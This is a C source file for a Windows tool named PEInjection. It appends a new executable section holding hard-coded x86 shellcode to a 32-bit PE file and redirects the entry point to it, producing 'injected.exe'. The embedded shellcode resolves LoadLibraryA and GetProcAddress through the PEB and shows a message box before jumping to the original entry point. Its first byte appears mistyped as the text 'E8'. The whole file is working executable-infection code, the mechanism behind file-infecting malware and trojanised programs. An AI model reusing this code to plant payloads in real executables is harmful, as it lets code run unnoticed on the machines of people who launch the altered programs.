#include <Windows.h>
#include <stdio.h>


int main(int argc, char * argv[]) {
	wchar_t filename[200];
	if (argc == 1) {
		printf("Usage: PEInjection <filename>\n");
		return 0;
	}
	printf("%s\n", argv[1]);
	MultiByteToWideChar(
		CP_UTF8,
		MB_PRECOMPOSED,
		argv[1],
		-1,
		filename,
		200
	);
	wprintf(L"%s\n", filename);
	HANDLE fileHandle = CreateFile(filename, GENERIC_READ, 0, NULL, 3, FILE_ATTRIBUTE_NORMAL, NULL);
	if (fileHandle == INVALID_HANDLE_VALUE) {
		printf("[x] Invalid File\n");
		return -1;
	}

	DWORD fileSize = GetFileSize(fileHandle, NULL);
	LPVOID data = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);
	DWORD numberOfByteToRead;
	ReadFile(fileHandle, data, fileSize, &numberOfByteToRead, NULL);
	PIMAGE_DOS_HEADER pFileDosHeader = (PIMAGE_DOS_HEADER)data;
	WORD bits = *(WORD*)((char*)data + pFileDosHeader->e_lfanew + sizeof(IMAGE_FILE_HEADER) + 4);
	printf("%x\n", bits);
	if (bits == 0x10b) {
		PIMAGE_NT_HEADERS32	pFileNTHeader = (PIMAGE_NT_HEADERS32)((char*)data + pFileDosHeader->e_lfanew);
		DWORD numberOfSection = pFileNTHeader->FileHeader.NumberOfSections;
		PIMAGE_SECTION_HEADER pFileSectionHeaderTable = (PIMAGE_SECTION_HEADER)((char*)pFileNTHeader + sizeof(IMAGE_NT_HEADERS32));
		PIMAGE_SECTION_HEADER tmp = pFileSectionHeaderTable + (numberOfSection - 1);
		DWORD injectSectionRVA = tmp->VirtualAddress + tmp->Misc.VirtualSize;
		injectSectionRVA += pFileNTHeader->OptionalHeader.SectionAlignment - (injectSectionRVA % pFileNTHeader->OptionalHeader.SectionAlignment);
		DWORD injectSectionVSize = 50 * pFileNTHeader->OptionalHeader.SectionAlignment;
		DWORD injectSectionRSize = 50 * pFileNTHeader->OptionalHeader.FileAlignment;
		DWORD injectSectionPointerToRawData = tmp->PointerToRawData + tmp->SizeOfRawData;
		// craft new section
		char * shellcode = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, injectSectionRSize);
		

		CopyMemory(shellcode,
			"E8\x00\x00\x00\x00\x58\x2D\x05\x10\x40\x00\xEB\x2D\x55\x8B\xEC"
			"\x52\x53\x56\x57\x33\xC0\x8B\x74\x24\x18\x8B\x7C\x24\x1C\x8A\x06"
			"\x8A\x27\x84\xC0\x74\x0E\x84\xE4\x74\x0A\x2A\xC4\x32\xE4\x46\x47"
			"\x84\xC0\x74\xEA\x5F\x5E\x5B\x5A\x5D\xC3\x55\x8B\xEC\x81\xEC\x08"
			"\x02\x00\x00\x89\x84\x24\x04\x02\x00\x00\x64\xA1\x30\x00\x00\x00"
			"\x8B\x40\x0C\x8B\x40\x14\x8B\x00\x8B\x00\x8B\x40\x10\x89\x44\x24"
			"\x20\x8B\x5C\x24\x20\x33\xD2\x8A\x53\x3C\x83\xC3\x04\x03\xDA\x83"
			"\xC3\x14\x33\xD2\x66\x8B\x13\x89\x54\x24\x1C\x83\xC3\x18\x8B\x54"
			"\x24\x1C\x81\xFA\x0B\x01\x00\x00\x75\x05\x83\xC3\x48\xEB\x03\x83"
			"\xC3\x58\x8B\x03\x8B\x54\x24\x20\x03\xD0\x89\x54\x24\x18\x8B\x44"
			"\x24\x20\x8B\x5A\x1C\x03\xD8\x89\x5C\x24\x24\x8B\x5A\x24\x03\x5C"
			"\x24\x20\x8B\x52\x20\x03\xD0\x33\xC9\x8B\x44\x24\x20\x03\x02\x50"
			"\xB8\x00\x00\x00\x00\x89\x84\x24\x00\x02\x00\x00\xB8\x61\x72\x79"
			"\x41\x89\x84\x24\xFC\x01\x00\x00\xB8\x4C\x69\x62\x72\x89\x84\x24"
			"\xF8\x01\x00\x00\xB8\x4C\x6F\x61\x64\x89\x84\x24\xF4\x01\x00\x00"
			"\x8D\x84\x24\xF4\x01\x00\x00\x50\xE8\x10\xFF\xFF\xFF\x83\xC4\x08"
			"\x85\xC0\x75\x15\x41\x33\xC0\x66\x8B\x03\xC1\xE0\x02\x03\x44\x24"
			"\x24\x8B\x00\x89\x44\x24\x14\xEB\x5E\x8B\x44\x24\x20\x03\x02\x50"
			"\xB8\x73\x73\x00\x00\x89\x84\x24\x00\x02\x00\x00\xB8\x64\x64\x72"
			"\x65\x89\x84\x24\xFC\x01\x00\x00\xB8\x72\x6F\x63\x41\x89\x84\x24"
			"\xF8\x01\x00\x00\xB8\x47\x65\x74\x50\x89\x84\x24\xF4\x01\x00\x00"
			"\x8D\x84\x24\xF4\x01\x00\x00\x50\xE8\xB0\xFE\xFF\xFF\x83\xC4\x08"
			"\x85\xC0\x75\x13\x41\x33\xC0\x66\x8B\x03\xC1\xE0\x02\x03\x44\x24"
			"\x24\x8B\x00\x89\x44\x24\x10\x83\xC2\x04\x83\xC3\x02\x83\xF9\x02"
			"\x0F\x85\x33\xFF\xFF\xFF\x8B\x5C\x24\x14\x03\x5C\x24\x20\xB8\x6C"
			"\x6C\x00\x00\x89\x84\x24\x00\x02\x00\x00\xB8\x33\x32\x2E\x64\x89"
			"\x84\x24\xFC\x01\x00\x00\xB8\x55\x73\x65\x72\x89\x84\x24\xF8\x01"
			"\x00\x00\x8D\x84\x24\xF8\x01\x00\x00\x50\xFF\xD3\x89\x44\x24\x08"
			"\x8B\x5C\x24\x10\x03\x5C\x24\x20\xB8\x6F\x78\x41\x00\x89\x84\x24"
			"\x00\x02\x00\x00\xB8\x61\x67\x65\x42\x89\x84\x24\xFC\x01\x00\x00"
			"\xB8\x4D\x65\x73\x73\x89\x84\x24\xF8\x01\x00\x00\x8D\x84\x24\xF8"
			"\x01\x00\x00\x50\x8B\x44\x24\x0C\x50\xFF\xD3\x89\x44\x24\x04\x8B"
			"\x5C\x24\x04\x33\xC0\x50\xB8\x69\x6F\x6E\x00\x89\x84\x24\x00\x02"
			"\x00\x00\xB8\x43\x61\x70\x74\x89\x84\x24\xFC\x01\x00\x00\x8D\x84"
			"\x24\xFC\x01\x00\x00\x50\xB8\x6C\x64\x00\x00\x89\x84\x24\xF4\x01"
			"\x00\x00\xB8\x6F\x57\x6F\x72\x89\x84\x24\xF0\x01\x00\x00\xB8\x48"
			"\x65\x6C\x6C\x89\x84\x24\xEC\x01\x00\x00\x8D\x84\x24\xEC\x01\x00"
			"\x00\x50\x33\xC0\x50\xFF\xD3\x64\xA1\x30\x00\x00\x00\x8B\x40\x0C"
			"\x8B\x40\x14\x8B\x40\x10\x03\x84\x24\x04\x02\x00\x00\x89\x84\x24"
			"\x08\x02\x00\x00\x83\xC0\x3C\x33\xD2\x8A\x10\x8B\x84\x24\x08\x02"
			"\x00\x00\x03\xC2\x83\xC0\x04\x83\xC0\x14\x83\xC0\x10\x8B\x10\x8B"
			"\x84\x24\x08\x02\x00\x00\x03\xC2\xFF\xE0", 666);
		// fix header
		IMAGE_DOS_HEADER injectDOSheader = *pFileDosHeader;
		IMAGE_NT_HEADERS32 injectNTHeader = *pFileNTHeader;
		injectNTHeader.FileHeader.NumberOfSections += 1;
		injectNTHeader.OptionalHeader.SizeOfCode += injectSectionRSize;
		injectNTHeader.OptionalHeader.SizeOfImage += injectSectionVSize;
		injectNTHeader.OptionalHeader.AddressOfEntryPoint = injectSectionRVA;
		HANDLE newFile = CreateFile(
			L"injected.exe",
			GENERIC_WRITE,
			FILE_SHARE_READ,
			NULL,
			CREATE_NEW,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);
		WriteFile(newFile, &injectDOSheader, sizeof(IMAGE_DOS_HEADER), &numberOfByteToRead, NULL);
		WriteFile(newFile, (char*)data + sizeof(IMAGE_DOS_HEADER), pFileDosHeader->e_lfanew - sizeof(IMAGE_DOS_HEADER), &numberOfByteToRead, NULL);
		WriteFile(newFile, &injectNTHeader, sizeof(IMAGE_NT_HEADERS32), &numberOfByteToRead, NULL);


		for (int i = 0; i < numberOfSection; i++) {
			PIMAGE_SECTION_HEADER tmp = pFileSectionHeaderTable + i;
			WriteFile(newFile, tmp, sizeof(IMAGE_SECTION_HEADER), &numberOfByteToRead, NULL);
		}
		IMAGE_SECTION_HEADER injectSectionHeader;
		injectSectionHeader.Misc.VirtualSize = injectSectionVSize;
		injectSectionHeader.SizeOfRawData = injectSectionRSize;
		injectSectionHeader.VirtualAddress = injectSectionRVA;
		injectSectionHeader.PointerToRawData = injectSectionPointerToRawData;
		injectSectionHeader.PointerToRelocations = 0;
		injectSectionHeader.PointerToLinenumbers = 0;
		injectSectionHeader.Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
		injectSectionHeader.NumberOfLinenumbers = 0;
		injectSectionHeader.NumberOfRelocations = 0;

		WriteFile(newFile, &injectSectionHeader, sizeof(IMAGE_SECTION_HEADER), &numberOfByteToRead, NULL);
		DWORD startOfSection = pFileSectionHeaderTable->PointerToRawData;
		DWORD currPointer = SetFilePointer(newFile, 0, NULL, FILE_CURRENT);
		while (currPointer < startOfSection) {
			WriteFile(newFile, "\0", 1, &numberOfByteToRead, NULL);
			currPointer++;
		}

		for (int i = 0; i < numberOfSection; i++) {
			PIMAGE_SECTION_HEADER tmp = pFileSectionHeaderTable + i;
			LPVOID section = (LPVOID)((char*)data + tmp->PointerToRawData);
			WriteFile(newFile, section, tmp->SizeOfRawData, &numberOfByteToRead, NULL);
		}
		WriteFile(newFile, shellcode, injectSectionRSize, &numberOfByteToRead, NULL);
		CloseHandle(newFile);
	}
}